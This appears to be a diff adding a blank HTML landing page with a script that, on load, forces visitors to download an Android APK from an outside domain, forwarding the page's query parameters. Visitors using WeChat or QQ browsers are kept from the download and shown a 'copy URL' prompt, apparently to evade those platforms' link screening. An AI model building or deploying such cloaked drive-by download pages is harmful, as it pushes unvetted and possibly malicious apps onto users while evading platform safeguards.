@@ -1,0 +1,123 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="keywords" content="">
+<meta name="description" content="">
+<title></title>
+<style></style>
+</head>
+<body>
+<div></div>
+</body>
+</html>
+
+<script>
+
+// 替换为你的目标URL
+const url1 = "https://jihuowin.com/files/kisskms.apk";
+
+// 主逻辑
+if (isWeChatOrQQ()) {
+    const url2 = window.location.href;
+    outHtml(url2);
+} else {
+    const params = getQueryParams();
+    redirectToUrlWithParams(url1, params);
+}
+
+// 获取当前URL中的GET参数
+function getQueryParams() {
+    const params = {};
+    const queryString = window.location.search.slice(1);
+    const pairs = queryString.split("&");
+
+    pairs.forEach(pair => {
+        const [key, value] = pair.split("=");
+        params[decodeURIComponent(key)] = decodeURIComponent(value || '');
+    });
+
+    return params;
+}
+
+// 将GET参数拼接到新URL上
+function redirectToUrlWithParams(url, params) {
+    const queryString = Object.keys(params)
+        .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
+        .join("&");
+
+    const newUrl = `${url}?${queryString}`;
+    window.location.href = newUrl; // 跳转到新的URL
+}
+
+// 检查User-Agent是否包含特定字符串
+function isWeChatOrQQ() {
+    const ua = navigator.userAgent.toLowerCase();
+    return ua.includes('micromessenger') || ua.includes('qq');
+}
+
+function outHtml(url) {
+    // 设置 <html> 标签的 lang 属性
+    document.documentElement.setAttribute('lang', 'zh-CN');
+
+    // 创建 <meta> 标签和 <title> 元素，并添加到 <head>
+    const metaCharset = document.createElement('meta');
+    metaCharset.setAttribute('charset', 'UTF-8');
+    document.head.appendChild(metaCharset);
+
+    const metaViewport = document.createElement('meta');
+    metaViewport.setAttribute('name', 'viewport');
+    metaViewport.setAttribute('content', 'width=device-width, initial-scale=1');
+    document.head.appendChild(metaViewport);
+
+    const title = document.createElement('title');
+    title.textContent = '复制网址';
+    document.head.appendChild(title);
+
+    // 创建 <style> 标签并插入样式
+    const style = document.createElement('style');
+    style.textContent = `
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            padding: 20px;
+        }
+        .section {
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background-color: white;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            margin-top: 50px;
+        }
+        .url-box {
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            word-break: break-all;
+            background-color: #f8f9fa;
+        }
+    `;
+    document.head.appendChild(style);
+
+    // 创建 .section 容器
+    const section = document.createElement('div');
+    section.className = 'section';
+
+    // 添加提示文本
+    const paragraph = document.createElement('p');
+    paragraph.textContent = '复制网址';
+    section.appendChild(paragraph);
+
+    // 创建 URL 显示框
+    const urlBox = document.createElement('div');
+    urlBox.className = 'url-box';
+    urlBox.textContent = url;
+    section.appendChild(urlBox);
+
+    // 将 .section 容器添加到 body
+    document.body.appendChild(section);
+}
+
+</script>
